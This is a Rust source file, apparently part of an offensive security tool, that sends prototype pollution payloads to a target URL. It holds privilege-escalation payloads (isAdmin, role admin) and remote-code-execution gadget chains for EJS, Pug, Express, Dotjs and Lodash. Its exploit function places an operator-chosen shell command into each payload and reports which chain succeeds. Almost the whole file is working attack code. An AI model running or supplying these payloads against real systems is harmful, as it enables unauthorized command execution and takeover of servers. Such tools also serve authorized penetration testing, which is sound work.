use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

pub async fn scan(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Prototype Pollution Scan", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("__proto__", r#"{"__proto__":{"polluted":"yes"}}"#),
        (
            "constructor.prototype",
            r#"{"constructor":{"prototype":{"polluted":"yes"}}}"#,
        ),
        ("__proto__ isAdmin", r#"{"__proto__":{"isAdmin":true}}"#),
        ("__proto__ role", r#"{"__proto__":{"role":"admin"}}"#),
        (
            "constructor proto isAdmin",
            r#"{"constructor":{"prototype":{"isAdmin":true}}}"#,
        ),
        (
            "__proto__ toString",
            r#"{"__proto__":{"toString":"polluted"}}"#,
        ),
        (
            "__proto__ hasOwnProperty",
            r#"{"__proto__":{"hasOwnProperty":"polluted"}}"#,
        ),
    ];

    for (name, payload) in &payloads {
        let resp = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                let reflected =
                    body.contains("polluted") || body.contains("isAdmin") || body.contains("admin");
                let status_str = if reflected {
                    "POLLUTED".red().bold().to_string()
                } else {
                    "ok".to_string()
                };
                println!(
                    "  {} {:30} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
                );
                if reflected {
                    println!(
                        "    {} Response contains polluted property!",
                        ">".red().bold()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:30} error", "*".cyan(), name);
            }
        }
    }

    println!(
        "\n{} Scan complete. Check if polluted properties appear in subsequent requests.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn gadget(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Prototype Pollution Gadget Chain Analysis",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let gadgets = [
        (
            "EJS RCE",
            r#"{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2"}"#,
        ),
        (
            "Pug RCE",
            r#"{"__proto__":{"block":{"type":"Text","val":"global.process.mainModule.require('child_process').exec('id')"}}}"#,
        ),
        (
            "Express view options",
            r#"{"__proto__":{"view options":{"client":true,"escapeFunction":"1;return process.mainModule.require('child_process').execSync('id').toString()"}}}"#,
        ),
        (
            "Handlebars compile",
            r#"{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":0,"params":[{"type":"NumberLiteral","value":0}],"hash":0,"escaped":0,"loc":0}],"strip":0,"__proto__":{"constructor":{"prototype":{"type":"MustacheStatement"}}}}}"#,
        ),
        (
            "Dotjs render",
            r#"{"__proto__":{"templateSettings":{"escape":"1;global.process.mainModule.require('child_process').exec('id')"}}}"#,
        ),
        (
            "Lodash template",
            r#"{"__proto__":{"source":"global.process.mainModule.require('child_process').exec('id')"}}}"#,
        ),
        (
            "JQuery extend",
            r#"{"__proto__":{"constructor":{"prototype":{"polluted":"yes"}}}}"#,
        ),
        (
            "Minimatch reDoS",
            r#"{"__proto__":{"toString":"a".repeat(10000)}}"#,
        ),
    ];

    for (name, payload) in &gadgets {
        let resp = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                let has_output = !body.is_empty()
                    && (body.contains("uid=")
                        || body.contains("root")
                        || body.contains("polluted"));
                let status_str = if has_output {
                    "EXPLOITED".red().bold().to_string()
                } else if status.is_server_error() {
                    "error (may have crashed)".yellow().to_string()
                } else {
                    "sent".to_string()
                };
                println!(
                    "  {} {:25} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
                );
                if has_output {
                    println!(
                        "    {} Output: {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:25} connection error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Gadget chain analysis complete.", "[*]".cyan().bold());
    println!(
        "{} Check server responses for command output or crash indicators.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn exploit(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    cmd: &str,
) -> anyhow::Result<()> {
    println!("{} Prototype Pollution Exploitation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} Cmd: {}", "[*]".cyan().bold(), cmd);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let exec_payloads = [
        (
            "EJS",
            format!(
                r#"{{"__proto__":{{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('{}');var __tmp2"}}}}"#,
                cmd
            ),
        ),
        (
            "Pug",
            format!(
                r#"{{"__proto__":{{"block":{{"type":"Text","val":"global.process.mainModule.require('child_process').exec('{}')"}}}}}}"#,
                cmd
            ),
        ),
        (
            "Express",
            format!(
                r#"{{"__proto__":{{"view options":{{"escapeFunction":"1;return process.mainModule.require('child_process').execSync('{}').toString()"}}}}}}"#,
                cmd
            ),
        ),
        (
            "Dotjs",
            format!(
                r#"{{"__proto__":{{"templateSettings":{{"escape":"1;global.process.mainModule.require('child_process').exec('{}')"}}}}}}"#,
                cmd
            ),
        ),
        (
            "Lodash",
            format!(
                r#"{{"__proto__":{{"source":"global.process.mainModule.require('child_process').exec('{}')"}}}}"#,
                cmd
            ),
        ),
    ];

    for (name, payload) in &exec_payloads {
        println!("{} Trying {} gadget...", "[*]".cyan().bold(), name);
        let resp = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.clone())
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                if body.contains("uid=") || body.contains("root") || !body.is_empty() {
                    println!("{} [+] {} gadget worked!", "[+]".green().bold(), name);
                    println!("    {} Status: {}", "*".cyan(), status);
                    println!(
                        "    {} Output: {}",
                        "*".cyan(),
                        body.chars().take(500).collect::<String>()
                    );
                    return Ok(());
                }
                println!("  {} {} - no output (status {})", "*".cyan(), name, status);
            }
            Err(_) => {
                println!("  {} {} - connection error", "*".cyan(), name);
            }
        }
    }

    println!(
        "{} No gadget chain succeeded. Server may not be vulnerable.",
        "[-]".yellow().bold()
    );
    Ok(())
}
